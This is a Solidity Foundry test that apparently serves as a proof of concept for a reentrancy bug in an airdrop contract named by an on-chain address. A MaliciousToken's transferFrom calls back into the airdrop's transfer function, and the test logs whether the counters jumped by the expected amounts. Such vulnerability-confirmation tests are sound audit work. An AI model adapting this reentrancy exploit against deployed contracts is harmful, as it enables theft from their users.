// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xa1fceeff3acc57d257b917e30c4df661401d6431.sol";

contract MaliciousToken {
    bool private reentered = false;
    AirDropContract public airDrop;
    address public controller;
    
    constructor(address _airDrop) {
        airDrop = AirDropContract(_airDrop);
        controller = msg.sender;
    }
    
    function transferFrom(address, address, uint256) external returns (bool) {
        if (!reentered) {
            reentered = true;
            // Prepare recipient and amount arrays for reentrant call
            address[] memory reentrantRecipients = new address[](1);
            uint[] memory reentrantAmounts = new uint[](1);
            reentrantRecipients[0] = controller;
            reentrantAmounts[0] = 1;
            // Reenter the vulnerable contract
            airDrop.transfer(address(this), reentrantRecipients, reentrantAmounts);
        }
        return true;
    }
}

contract ReentrancyTest is Test {
    AirDropContract airDrop;
    MaliciousToken malToken;
    address attacker = address(0x1337);

    function setUp() public {
        airDrop = new AirDropContract();
        malToken = new MaliciousToken(address(airDrop));
    }
    
    function testReentrancyVulnerability() public {
        // Set up attacker
        vm.startPrank(attacker);
        
        console2.log("--- BEFORE-Trigger State ---");
        // Record initial state before the attack
        uint256 initialTokens = airDrop.totalTokensDistributed();
        uint256 initialAirdrops = airDrop.totalAirdrops();
        console2.log("Initial totalTokensDistributed:", initialTokens);
        console2.log("Initial totalAirdrops:", initialAirdrops);
        
        // Prepare addresses and amounts for initial call
        address[] memory recipients = new address[](1);
        uint[] memory amounts = new uint[](1);
        recipients[0] = address(malToken);
        amounts[0] = 10;
        
        console2.log("");
        console2.log("--- Triggering Reentrancy ---");
        // Execute initial transfer to trigger reentrancy
        airDrop.transfer(address(malToken), recipients, amounts);
        
        console2.log("");
        console2.log("--- AFTER-Trigger State ---");
        // Record final state after the attack
        uint256 finalTokens = airDrop.totalTokensDistributed();
        uint256 finalAirdrops = airDrop.totalAirdrops();
        console2.log("Final totalTokensDistributed:", finalTokens);
        console2.log("Final totalAirdrops:", finalAirdrops);
        
        // Calculate state differences
        uint256 tokenDiff = finalTokens - initialTokens;
        uint256 airdropDiff = finalAirdrops - initialAirdrops;
        console2.log("Actual token increase:", tokenDiff);
        console2.log("Actual airdrop count increase:", airdropDiff);
        
        console2.log("");
        // Determine exploitation result
        bool reentrancyDetected = tokenDiff == 11 && airdropDiff == 2;
        if (reentrancyDetected) {
            console2.log("DIAGNOSIS: Reentrancy altered state (+11 tokens, +2 airdrops)");
        } else {
            console2.log("DIAGNOSIS: Normal state change (%s tokens, %s airdrops)", tokenDiff, airdropDiff);
        }
        
        // Final verdict
        if (reentrancyDetected) {
            console2.log("Vulnerability Exists: Reentrancy attack successfully manipulated state variables");
        } else {
            console2.log("Vulnerability not Exist: Reentrancy attack failed to alter state as expected");
        }
    }
}